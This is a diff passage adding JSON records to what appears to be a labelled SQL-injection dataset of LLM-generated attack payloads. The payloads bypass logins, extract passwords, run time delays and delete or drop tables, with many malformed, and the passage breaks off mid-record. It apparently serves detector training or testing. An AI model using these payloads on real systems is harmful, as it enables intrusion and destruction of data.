+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1'); DELETE FROM users LIMIT 1;\"",
+    "full_query": "SELECT * FROM users WHERE id = 1'); DELETE FROM users LIMIT 1;\"",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1)/* Comment */; INSERT INTO users (username, password) VALUES ('admin', 'password');\"",
+    "full_query": "SELECT * FROM users WHERE id = 1)/* Comment */; INSERT INTO users (username, password) VALUES ('admin', 'password');\"",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1); UPDATE users SET password = 'hacked' WHERE id = 1;\"",
+    "full_query": "SELECT * FROM users WHERE id = 1); UPDATE users SET password = 'hacked' WHERE id = 1;\"",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "user_lookup",
+    "payload": "1'))/* Another Comment */; TRUNCATE TABLE users;\",]",
+    "full_query": "SELECT * FROM users WHERE id = 1'))/* Another Comment */; TRUNCATE TABLE users;\",]",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": "); INSERT INTO logs VALUES('attack'); --",
+    "full_query": "SELECT * FROM orders WHERE status = '); INSERT INTO logs VALUES('attack'); --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": ";--\\\"\\\"=\\\"\\\" UNION ALL SELECT NULL,NULL,'dropped_table',NULL#\"",
+    "full_query": "SELECT * FROM orders WHERE status = ';--\\\"\\\"=\\\"\\\" UNION ALL SELECT NULL,NULL,'dropped_table',NULL#\"' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": ";/**/ALTER TABLE users SET password='hacked'/**/\"",
+    "full_query": "SELECT * FROM orders WHERE status = ';/**/ALTER TABLE users SET password='hacked'/**/\"' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": "OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--",
+    "full_query": "SELECT * FROM orders WHERE status = 'OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name='admin')--' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": "; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_addextendedproperty @name=N'MS_Description', @value=N'This is a comment to mask the SQL command', @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'orders'; --",
+    "full_query": "SELECT * FROM orders WHERE status = '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_addextendedproperty @name=N'MS_Description', @value=N'This is a comment to mask the SQL command', @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'orders'; --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": "; WAITFOR DELAY '0:0:10'; UPDATE orders SET status = 'processed' WHERE user_id < 100 --",
+    "full_query": "SELECT * FROM orders WHERE status = '; WAITFOR DELAY '0:0:10'; UPDATE orders SET status = 'processed' WHERE user_id < 100 --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "order_filter",
+    "payload": "; DECLARE @cmd NVARCHAR(500); SET @cmd = N'DELETE FROM orders WHERE 1=1'; EXECUTE(@cmd) --",
+    "full_query": "SELECT * FROM orders WHERE status = '; DECLARE @cmd NVARCHAR(500); SET @cmd = N'DELETE FROM orders WHERE 1=1'; EXECUTE(@cmd) --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "comment_insert",
+    "payload": "' UNION ALL SELECT 1, 1, 1, 1 #",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' UNION ALL SELECT 1, 1, 1, 1 #')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "comment_insert",
+    "payload": "; SELECT * FROM users WHERE '1'='1",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '; SELECT * FROM users WHERE '1'='1')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "comment_insert",
+    "payload": "' AND 1=1/*; DELETE FROM sessions;",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1/*; DELETE FROM sessions;')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "comment_insert",
+    "payload": "--''; EXEC sp_droplogin 'sa'; --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--''; EXEC sp_droplogin 'sa'; --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "stacked_queries",
+    "template_context": "comment_insert",
+    "payload": "--\"; WAITFOR DELAY '0:0:5' AND (SELECT '%' = '%')",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--\"; WAITFOR DELAY '0:0:5' AND (SELECT '%' = '%')')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "--1' OR 1=1#",
+    "full_query": "SELECT * FROM users WHERE username = '--1' OR 1=1#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "1'/**/OR/**/?=1--",
+    "full_query": "SELECT * FROM users WHERE username = '1'/**/OR/**/?=1--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "1'/*1=1",
+    "full_query": "SELECT * FROM users WHERE username = '1'/*1=1' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "/**/SELECT/**/NULL/**/FROM/**/users/**/WHERE/**/username/**/=/**/'--'/**/AND/**/password/**/=/**/'anything'",
+    "full_query": "SELECT * FROM users WHERE username = '/**/SELECT/**/NULL/**/FROM/**/users/**/WHERE/**/username/**/=/**/'--'/**/AND/**/password/**/=/**/'anything'' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "1'/**/OR/**/CASE/**/WHEN/**/3%3D3/**/THEN/**/1/**/ELSE/**/0/**/END/**/=/**/1/**/#",
+    "full_query": "SELECT * FROM users WHERE username = '1'/**/OR/**/CASE/**/WHEN/**/3%3D3/**/THEN/**/1/**/ELSE/**/0/**/END/**/=/**/1/**/#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "--1'/**/UNION/**/ALL/**/SELECT/**/NULL/**/,/**/NULL/**/,/**/NULL/**/#",
+    "full_query": "SELECT * FROM users WHERE username = '--1'/**/UNION/**/ALL/**/SELECT/**/NULL/**/,/**/NULL/**/,/**/NULL/**/#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "1'/**/LIKE/**/'-1'/**/-/**/%'/**//**/AND/**/password/**/=/**/'anything'/**/--",
+    "full_query": "SELECT * FROM users WHERE username = '1'/**/LIKE/**/'-1'/**/-/**/%'/**//**/AND/**/password/**/=/**/'anything'/**/--' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "-1'/**/UNION/**/SELECT/**/1,/**/2,/**/SUBSTR(CAST(SLEEP(5)/**/AS/**/VARCHAR),/**/1,/**/1)/**/LIMIT/**/1/**/#",
+    "full_query": "SELECT * FROM users WHERE username = '-1'/**/UNION/**/SELECT/**/1,/**/2,/**/SUBSTR(CAST(SLEEP(5)/**/AS/**/VARCHAR),/**/1,/**/1)/**/LIMIT/**/1/**/#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "'/*'*/ OR 1=1#",
+    "full_query": "SELECT * FROM users WHERE username = ''/*'*/ OR 1=1#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "--'/**/ OR CHAR(65)-32 IN ('A')#",
+    "full_query": "SELECT * FROM users WHERE username = '--'/**/ OR CHAR(65)-32 IN ('A')#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "login",
+    "payload": "' AND /* */(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)#",
+    "full_query": "SELECT * FROM users WHERE username = '' AND /* */(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1'/*'*/and/**/(select/**/count(*)/**/from/**/information_schema.tables)",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1'/*'*/and/**/(select/**/count(*)/**/from/**/information_schema.tables)%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1'#'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1'#'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": ";/**/insert/**/into/**/products(name)/**/values('Exploit')--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%;/**/insert/**/into/**/products(name)/**/values('Exploit')--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "'1'/**/or/**/ASCII(SUBSTRING(username,1,1))<110--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%'1'/**/or/**/ASCII(SUBSTRING(username,1,1))<110--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1'/*!*/ OR 1= (SELECT /*! COUNT(*/ * /*!) FROM INFORMATION_SCHEMA.TABLES)",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1'/*!*/ OR 1= (SELECT /*! COUNT(*/ * /*!) FROM INFORMATION_SCHEMA.TABLES)%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1'--# OR 1= (/**/SELECT/**/CONCAT(CAST(LENGTH((SELECT /**/ user())) AS CHAR)))#",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1'--# OR 1= (/**/SELECT/**/CONCAT(CAST(LENGTH((SELECT /**/ user())) AS CHAR)))#%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1'%20OR%201= (%00SELECT%00%20CASE%20WHEN%20(SELECT%20%20%201%20FROM%20dual)%20THEN%20%27a%27%20ELSE%20%27b%27%20END)",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1'%20OR%201= (%00SELECT%00%20CASE%20WHEN%20(SELECT%20%20%201%20FROM%20dual)%20THEN%20%27a%27%20ELSE%20%27b%27%20END)%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1'/**/%0A UNION ALL SELECT NULL--, NULL --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1'/**/%0A UNION ALL SELECT NULL--, NULL --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "1' OR 1= (SELECT UPPER(CONCAT(CHAR(67),CHAR(67),CHAR(69))))--",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%1' OR 1= (SELECT UPPER(CONCAT(CHAR(67),CHAR(67),CHAR(69))))--%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "/**/1'/**/ AND/**/ (SELECT/**/ COUNT(*)/**/ FROM/**/ users)/**/ --",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%/**/1'/**/ AND/**/ (SELECT/**/ COUNT(*)/**/ FROM/**/ users)/**/ --%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "--1'/**/ OR/**/ ASCII(SUBSTRING(password,1,1)) < 115",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%--1'/**/ OR/**/ ASCII(SUBSTRING(password,1,1)) < 115%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "search",
+    "payload": "#1'/**/ WAITFOR DELAY '0:0:10'/**/ AND/**/ '%' = '%'",
+    "full_query": "SELECT * FROM products WHERE name LIKE '%#1'/**/ WAITFOR DELAY '0:0:10'/**/ AND/**/ '%' = '%'%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "#/**/1' UNION SELECT username, password FROM admins#",
+    "full_query": "SELECT * FROM users WHERE id = #/**/1' UNION SELECT username, password FROM admins#",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '#%'--",
+    "full_query": "SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '#%'--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "-3999\"') OR '1'='1'--+",
+    "full_query": "SELECT * FROM users WHERE id = -3999\"') OR '1'='1'--+",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "' OR 'x'='x'/*'a'='a",
+    "full_query": "SELECT * FROM users WHERE id = ' OR 'x'='x'/*'a'='a",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "/**/1' /*comment*/ OR EXISTS(SELECT * FROM users /*comment*/ WHERE id = 'admin' AND password LIKE '#%%'",
+    "full_query": "SELECT * FROM users WHERE id = /**/1' /*comment*/ OR EXISTS(SELECT * FROM users /*comment*/ WHERE id = 'admin' AND password LIKE '#%%'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "--1' UNION ALL SELECT username, password FROM users --",
+    "full_query": "SELECT * FROM users WHERE id = --1' UNION ALL SELECT username, password FROM users --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "#1' OR CAST(CHAR(48, 49, 50, 48, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48) AS INT) > 0 --",
+    "full_query": "SELECT * FROM users WHERE id = #1' OR CAST(CHAR(48, 49, 50, 48, 49, 48, 48, 48, 48, 48, 48, 48, 48, 48) AS INT) > 0 --",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "-1' OR (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_type = 'BASE TABLE')) = 1--",
+    "full_query": "SELECT * FROM users WHERE id = -1' OR (SELECT 1 FROM (SELECT COUNT(*) FROM information_schema.tables WHERE table_type = 'BASE TABLE')) = 1--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "//1' OR 1=1/#",
+    "full_query": "SELECT * FROM users WHERE id = //1' OR 1=1/#",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "/**/1' UNION SELECT username, password FROM users/**/",
+    "full_query": "SELECT * FROM users WHERE id = /**/1' UNION SELECT username, password FROM users/**/",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "--1' OR (SELECT MAX(id) FROM users) > 1--",
+    "full_query": "SELECT * FROM users WHERE id = --1' OR (SELECT MAX(id) FROM users) > 1--",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "user_lookup",
+    "payload": "#1' OR (SELECT 1 FROM system_tables) = 1#",
+    "full_query": "SELECT * FROM users WHERE id = #1' OR (SELECT 1 FROM system_tables) = 1#",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "order_filter",
+    "payload": "/**/ OR /**/'1'='1",
+    "full_query": "SELECT * FROM orders WHERE status = '/**/ OR /**/'1'='1' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "order_filter",
+    "payload": "1'; /* --",
+    "full_query": "SELECT * FROM orders WHERE status = '1'; /* --' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "order_filter",
+    "payload": "-- OR '1'='1",
+    "full_query": "SELECT * FROM orders WHERE status = '-- OR '1'='1' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "order_filter",
+    "payload": "# OR 'a'='a'/*",
+    "full_query": "SELECT * FROM orders WHERE status = '# OR 'a'='a'/*' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "order_filter",
+    "payload": "/* OR */'b'='b'",
+    "full_query": "SELECT * FROM orders WHERE status = '/* OR */'b'='b'' ORDER BY date DESC",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "--%23 AND (SELECT 1 FROM users WHERE username = 'admin') --",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--%23 AND (SELECT 1 FROM users WHERE username = 'admin') --')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "/*-- AND 'x'='x'",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '/*-- AND 'x'='x'')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "[\"/**/ 3580  =  (select count(*) from domain.domains as t1, domain.columns as t2, domain.tables as t3)\", \"-- ' OR 1=1 --\", \"# ; DROP TABLE IF EXISTS comments;#\", \"/*\") */ SELECT 1 FROM users WHERE username = 'admin'\", \"1%' OR 1=1 AND '%' = '\"]",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '[\"/**/ 3580  =  (select count(*) from domain.domains as t1, domain.columns as t2, domain.tables as t3)\", \"-- ' OR 1=1 --\", \"# ; DROP TABLE IF EXISTS comments;#\", \"/*\") */ SELECT 1 FROM users WHERE username = 'admin'\", \"1%' OR 1=1 AND '%' = '\"]')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "/*# AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'users')",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '/*# AND 1=(SELECT 1 FROM information_schema.tables WHERE table_name = 'users')')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "#; WAITFOR DELAY '0:0:5' AND (1=1))",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '#; WAITFOR DELAY '0:0:5' AND (1=1))')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "comment_obfuscation",
+    "template_context": "comment_insert",
+    "payload": "--%23 AND (SELECT 1 FROM users WHERE username LIKE '%admin')",
+    "full_query": "INSERT INTO comments (user_id, body) VALUES (1, '--%23 AND (SELECT 1 FROM users WHERE username LIKE '%admin')')",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "1' AND (SELECT IF(SUBSTRING((SELECT USER()),1,1)='root',1,0))#",
+    "full_query": "SELECT * FROM users WHERE username = '1' AND (SELECT IF(SUBSTRING((SELECT USER()),1,1)='root',1,0))#' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "1' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.USERS WHERE PASSWORD='')",
+    "full_query": "SELECT * FROM users WHERE username = '1' OR EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.USERS WHERE PASSWORD='')' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 1
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "%27+UNION+SELECT+NULL+FROM+(SELECT+CASE+WHEN+%28SELECT+SLEEP%285%29%29%3D%28SELECT+SLEEP%285%29%29+THEN+1+ELSE+0+END+AS+x+FROM+dual)%2B'%27--+",
+    "full_query": "SELECT * FROM users WHERE username = '%27+UNION+SELECT+NULL+FROM+(SELECT+CASE+WHEN+%28SELECT+SLEEP%285%29%29%3D%28SELECT+SLEEP%285%29%29+THEN+1+ELSE+0+END+AS+x+FROM+dual)%2B'%27--+' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 2
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "%27 UNION ALL SELECT NULL, NULL, NULL FROM (SELECT 1 FROM users WHERE username LIKE '%'\"",
+    "full_query": "SELECT * FROM users WHERE username = '%27 UNION ALL SELECT NULL, NULL, NULL FROM (SELECT 1 FROM users WHERE username LIKE '%'\"' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "OR '1'='1' --\"",
+    "full_query": "SELECT * FROM users WHERE username = 'OR '1'='1' --\"' AND password = 'anything'",
+    "label": 1,
+    "source": "llm_generated",
+    "generator_model": "Qwen/Qwen2.5-Coder-7B-Instruct",
+    "round": 3
+  },
+  {
+    "attack_category": "encoding_obfuscation",
+    "template_context": "login",
+    "payload": "CHAR(39) || ' OR ' || CHAR(39) || '1' || CHAR(39) || '=' || CHAR(39) || '1' || CHAR(39)",
